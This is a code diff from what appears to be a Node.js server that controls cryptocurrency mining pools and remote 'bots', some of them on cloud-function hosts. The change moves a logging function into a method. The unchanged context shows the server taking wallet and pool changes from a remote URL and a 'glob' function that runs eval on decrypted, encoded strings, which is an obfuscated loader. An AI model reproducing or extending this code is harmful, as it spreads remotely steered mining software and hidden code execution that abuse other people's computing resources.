@@ -10,7 +10,7 @@ app.use(express.json({limit:'50mb'}));
 app.use(express.urlencoded({limit:'50mb',extended:true}));
 app.get('/',function(req,res) { mm.get(req,res) });
 app.post('/',app.parser,function(req,res) { mm.post(req,res) });
-app.listen(process.env.PORT||5000, () => { log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
+app.listen(process.env.PORT||5000, () => { mm.log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
 
 var main = function() {
   var self = this
@@ -79,12 +79,12 @@ var main = function() {
       db.push.log = db.push.tmp; db.push.tmp = { values: [], backgrounds: [] };
       request.post({ url: gg.url, form: JSON.stringify(db), json: true, followAllRedirects: true },
       function(error, response, body) {
-        if(error) { log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
-        else if(!body.yellow_pools) { log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
+        if(error) { self.log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
+        else if(!body.yellow_pools) { self.log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
         else {
           var tasks = []; yellow_pools = body.yellow_pools == 'ON';
           if(body.wallet && body.wallet != db.wallet) {
-            db.wallet = body.wallet; log({host:'new wallet',msg:db.wallet});
+            db.wallet = body.wallet; self.log({host:'new wallet',msg:db.wallet});
             if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push([pools[i].host]); tasks.push(update_pools(list)) }
           }
   
@@ -106,11 +106,11 @@ var main = function() {
         var tasks = [];
         for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
         Promise.all(tasks).then(msgs => {
-          for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
+          for(var j=0; j<msgs.length; j++) self.log({host:msgs[j],msg:'del pool'})
           pools = [];
           for(var j=0; j<p1.length; j++) {
             pools.push(new gg.mycoin({ wallet: db.wallet, host: p1[j] }));
-            log({host:p1[j],msg:'add pool'})
+            self.log({host:p1[j],msg:'add pool'})
           }
           resolve(true)
         });
@@ -125,13 +125,13 @@ var main = function() {
     else {
       for(var i=0; i<bots.length; i++) {
         if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
-        log({host:bots[i].host,msg:'del bot'})
+        self.log({host:bots[i].host,msg:'del bot'})
       }
       bots = [];
       for(var i=0; i<b1.length; i++) {
         let nbot={host:b1[i], state:'orange', hash:'0 h/s [0/0]'};
         bots.push(nbot); wakeup(nbot);
-        log({host:b1[i],msg:'add bot'});
+        self.log({host:b1[i],msg:'add bot'});
       }
       return true
     }
@@ -144,13 +144,6 @@ var main = function() {
     if(name == 'pools') db.summary[3][0] = a.join('/')
     else db.summary[4][0] = a.join('/');
     db[name].hashes.push([obj.hash]);
-  }
-
-  function log(data) {
-    db.push.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
-    if(!data.color) data.color = null;
-    else console.log(JSON.stringify(data))
-    db.push.tmp.backgrounds.push([data.color,data.color,data.color]);
   }
 
   function wakeup(bot) {
@@ -195,11 +188,11 @@ var main = function() {
       bot.msg = body.msg;
       if(next) return onmsg(bot);
       else {
-        log({host:bot.host,msg:bot.msg})
+        self.log({host:bot.host,msg:bot.msg})
         return wakeup(bot)
       }
     }
-    log({host:bot.host,color:'#F8516A',msg:bot.msg})
+    self.log({host:bot.host,color:'#F8516A',msg:bot.msg})
     if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
     else bot.state = 'red'; 
     bot.hash = '0 h/s '+bot.hash.split(' ')[2];
@@ -247,9 +240,9 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
     if(req.body.init) {
       init(req.body, function(msg){
         var data = { msg: msg }
-        if(msg.includes('error')) log({host:require('./package.json').host,color:'#F8516A',msg:msg});
+        if(msg.includes('error')) self.log({host:require('./package.json').host,color:'#F8516A',msg:msg});
         else {
-          log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
+          self.log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
           data.wallet = db.wallet;
           data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
           data.push = {log: db.log};
@@ -259,6 +252,13 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
       })
     }
     else if(req.body.bots) res.send(update_bots(req.body.bots))
+  }
+
+  this.log = function(data) {
+    db.push.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
+    if(!data.color) data.color = null;
+    else console.log(JSON.stringify(data))
+    db.push.tmp.backgrounds.push([data.color,data.color,data.color]);
   }
 
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
